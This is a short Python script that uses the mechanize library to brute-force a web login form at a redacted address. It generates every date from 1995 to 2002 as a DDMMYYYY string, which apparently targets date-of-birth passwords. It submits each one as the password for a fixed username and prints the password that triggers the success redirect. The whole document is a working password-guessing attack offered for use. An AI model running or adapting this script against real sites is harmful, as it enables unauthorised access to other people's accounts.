#!/usr/bin/python
import mechanize


br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

from datetime import timedelta, date

combos=[]
def daterange(start_date, end_date):
    for n in range(int ((end_date - start_date).days)):
        yield start_date + timedelta(n)

start_date = date(1995, 1, 1)
end_date = date(2002, 12, 31)


for single_date in daterange(start_date, end_date):
     combos.append(single_date.strftime("%d%m%Y"))




r =br.open("http://redacted.asp")
for x in combos:
	new_form = '''
	<form method="post" action="redacted.asp">
	<b>Enter the username :</b><input type="text" name="t1" size="16" maxlength="8">
	<b>Enter the password:</b><input type="password" name="t2" size="16">
	<input type="submit" name="submit" value="Submit">
	</form>
	'''

	r.set_data(new_form)
	br.set_response(r)
	br.select_form( nr = 0 )
	br.form['t1'] = "xxxxxxx"  #insert the username
	br.form['t2'] = x   
	print "Checking ",br.form['t2']
	response=br.submit()
	if response.geturl()=="http://newredactedurl.asp":

		print "Correct password is ",x
		break
